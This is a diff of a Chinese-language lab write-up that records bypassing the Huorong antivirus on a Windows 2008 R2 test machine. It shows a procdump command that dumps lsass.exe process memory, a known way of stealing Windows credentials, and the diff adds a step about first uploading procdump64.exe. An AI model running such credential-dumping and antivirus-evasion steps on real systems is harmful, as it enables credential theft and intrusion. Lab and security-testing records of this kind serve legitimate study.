@@ -8,7 +8,7 @@
 
 ### 0x01 过火绒过程记录
 受害虚拟机：Windows 2008 R2安装火绒  
-执行命令
+上传procdump64.exe后执行命令
 ```
 .\procdump64.exe -accepteula -ma lsass.exe lsass.dmp
 ```
